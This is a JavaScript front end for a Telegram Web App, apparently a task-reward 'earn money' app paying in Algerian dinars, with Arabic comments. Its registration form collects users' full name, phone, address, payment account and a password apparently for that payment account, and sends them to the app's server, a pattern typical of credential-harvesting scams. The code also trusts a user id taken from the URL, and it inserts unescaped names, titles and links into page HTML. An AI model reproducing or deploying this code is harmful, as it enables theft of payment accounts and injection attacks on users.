const tg = window.Telegram.WebApp;
tg.expand();
let currentUserId = null;

async function init() {
    const urlParams = new URLSearchParams(window.location.search);
    currentUserId = urlParams.get('uid') || tg.initDataUnsafe?.user?.id;

    if (!currentUserId) {
        // محاولة أخيرة
        alert("⚠️ لم يتم التعرف على الحساب.");
        document.getElementById('register-screen').classList.remove('hidden');
        return;
    }

    try {
        const res = await fetch(`/api/user/${currentUserId}`);
        const user = await res.json();

        if (user.paymentLocked) {
            showTab('home'); // فتح الصفحة الرئيسية
            document.getElementById('navbar').classList.remove('hidden');
            updateUI(user);
        } else {
            document.getElementById('register-screen').classList.remove('hidden');
            if(tg.initDataUnsafe?.user?.first_name) document.getElementById('r-name').value = tg.initDataUnsafe.user.first_name;
        }
    } catch (e) { alert("خطأ في الشبكة"); }
}

// التنقل بين التبويبات
function showTab(tabName) {
    // إخفاء كل الشاشات
    document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
    // إظهار الشاشة المطلوبة
    document.getElementById(tabName + '-screen').classList.remove('hidden');
    
    // تحديث الشريط السفلي
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    // تفعيل الزر المناسب (يتطلب منطق بسيط لتحديد العنصر)
    
    if(tabName === 'home') loadTasks();
    if(tabName === 'top') loadLeaderboard();
    if(tabName === 'wallet') loadWalletInfo();
}

function updateUI(user) {
    document.getElementById('balance').innerText = user.balance.toFixed(2);
}

// المكافأة اليومية
async function claimDaily() {
    const res = await fetch('/api/daily', {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ userId: currentUserId })
    });
    const json = await res.json();
    if(json.success) { alert("🎉 " + json.msg); location.reload(); }
    else alert("⚠️ " + json.error);
}

// المتصدرين
async function loadLeaderboard() {
    const res = await fetch('/api/leaderboard');
    const users = await res.json();
    const tbody = document.querySelector('#leaderboard-table tbody');
    tbody.innerHTML = users.map((u, i) => `
        <tr>
            <td>${i+1} ${i===0?'👑':''}</td>
            <td>${u.name}</td>
            <td class="gold">${u.totalEarned.toFixed(1)}</td>
        </tr>
    `).join('');
}

// المحفظة
async function loadWalletInfo() {
    const res = await fetch(`/api/user/${currentUserId}`);
    const user = await res.json();
    document.getElementById('p-name').innerText = user.fullName;
    document.getElementById('p-acc').innerText = user.paymentAccount;
}

// التسجيل والمهام (نفس الكود السابق)
async function register() {
    const data = {
        userId: currentUserId,
        fullName: document.getElementById('r-name').value,
        phone: document.getElementById('r-phone').value,
        address: document.getElementById('r-addr').value,
        method: document.getElementById('r-method').value,
        account: document.getElementById('r-acc').value,
        pass: document.getElementById('r-pass').value
    };
    if (!data.account || !data.pass) return alert("أكمل البيانات!");
    
    await fetch('/api/register', {
        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data)
    });
    location.reload();
}

async function loadTasks() {
    const res = await fetch('/api/tasks');
    const tasks = await res.json();
    document.getElementById('tasks-container').innerHTML = tasks.map(t => `
        <div class="glass task">
            <div><h4>${t.title}</h4><span class="gold">+${t.reward} DZD</span></div>
            <button class="btn small primary" onclick="doTask('${t.id}', '${t.url}', ${t.seconds})">بدء</button>
        </div>
    `).join('');
}

function doTask(id, url, sec) {
    tg.openLink(url);
    setTimeout(async () => {
        const res = await fetch('/api/claim', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ userId: currentUserId, taskId: id })
        });
        const json = await res.json();
        if(json.success) { alert("✅ تم!"); location.reload(); }
    }, sec * 1000);
}

init();
